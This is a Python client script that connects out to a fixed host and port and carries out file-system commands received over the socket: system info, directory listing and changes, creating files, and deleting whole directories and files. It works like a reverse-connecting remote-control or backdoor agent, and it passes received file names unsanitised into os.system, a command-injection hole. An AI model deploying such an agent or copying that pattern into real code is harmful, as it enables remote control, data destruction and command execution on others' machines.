import json
import os
import platform
# import psutil
import shutil
import socket


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.43.22', 6009))


def send_data(message: str):
    data = message.encode('utf-8')
    client.sendall(data)


def receive_data() -> str:
    message = client.recv(1024)
    return message.decode()

# system
def send_info():
    data = {}
    try:
        data['System'] = platform.system() + platform.release()
        data['Architecture'] = platform.machine()
        data['Processor'] = platform.processor()
        # data['RAM'] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    except Exception as ex:
        message = str(ex)
        send_data(message)

    if data:
        data_str = json.dumps(data)
        send_data(data_str)
    else:
        message = "NO INFO"
        send_data(message)

# cwd
def send_cwd():
    cwd = os.getcwd()

    send_data(cwd)

# ls
def send_files_and_dirs():
    list_of_fd = os.listdir(os.getcwd())

    data_str = ''

    for item in list_of_fd:
        data_str += item + ' '
    if data_str:
        send_data(data_str)
    else:
        send_data("'THERE ARE NOTHING'")

# cd
def change_dir():
    next_dir = receive_data().split()[0]
    print(f"dir: {next_dir}")
    # if os.path.exists(f"{os.getcwd()}{os.sep}{next_dir}"):
    if os.path.isdir(next_dir):
        if platform.system() == 'Windows':
            if len(next_dir.split(os.sep)) == 1 and next_dir[1] != ':':
                if next_dir == os.pardir:
                    os.chdir(os.pardir)
                else:
                    os.chdir(f"{os.getcwd()}{os.sep}{next_dir}")
            else:
                os.chdir(next_dir)
        else:
            if len(next_dir.split(os.sep)) == 1:
                if next_dir == os.pardir:
                    os.chdir(os.pardir)
                else:
                    os.chdir(next_dir)
            else:
                os.chdir(next_dir)
    print(os.getcwd())

# mkdir
def make_dir():
    new_dir = receive_data()
    print(new_dir)
    if platform.system() == 'Windows':
        if len(new_dir.split(os.sep)) == 1 and new_dir[1] != ':':
            os.mkdir(f"{os.getcwd()}{os.sep}{new_dir}")
        elif len(new_dir.split(os.sep)) == 1 and new_dir[1] == ':':
            print('BAD DIRECTORY')
        else:
            os.mkdir(new_dir)
    else:
        if len(new_dir.split(os.sep)) == 1:
            os.mkdir(f"{os.getcwd()}{os.sep}{new_dir}")
        else:
            os.mkdir(new_dir)

# rmdir
def rm_dir():
    dir_path = receive_data()
    print(dir_path)
    if platform.system() == 'Windows':
        if len(dir_path.split(os.sep)) == 1 and dir_path[1] != ':':
            shutil.rmtree(os.getcwd() + dir_path)
        elif len(dir_path.split(os.sep)) == 1 and dir_path[1] == ':':
            print('NO PERMISSION')
        else:
            shutil.rmtree(dir_path)
    else:
        if len(dir_path.split(os.sep)) == 1:
            shutil.rmtree(f"{os.getcwd()}{os.sep}{dir_path}")
        else:
            shutil.rmtree(dir_path)

# mkfile
def create_file():
    file_name = receive_data()
    if platform.system() == 'Windows':
        os.system(f"NUL> {file_name}")
    else:
        os.system(f"touch {file_name}")

# rmfile
def rm_file():
    file_name = receive_data()
    try:
        os.remove(file_name)
    except FileNotFoundError:
        print("UNKNOWN FILE")


def handler():
    while True:
        command = receive_data()

        if 'system' in command:
            send_info()

        elif 'cwd' in command:
            send_cwd()

        elif 'ls' in command:
            send_files_and_dirs()

        elif 'cd' in command:
            change_dir()

        elif 'mkdir' in command:
            make_dir()

        elif 'rmdir' in command:
            rm_dir()

        elif 'mkfile' in command:
            create_file()

        elif 'rmfile' in command:
            rm_file()


try:
    handler()
finally:
    print('Connection closed')
    client.close()
    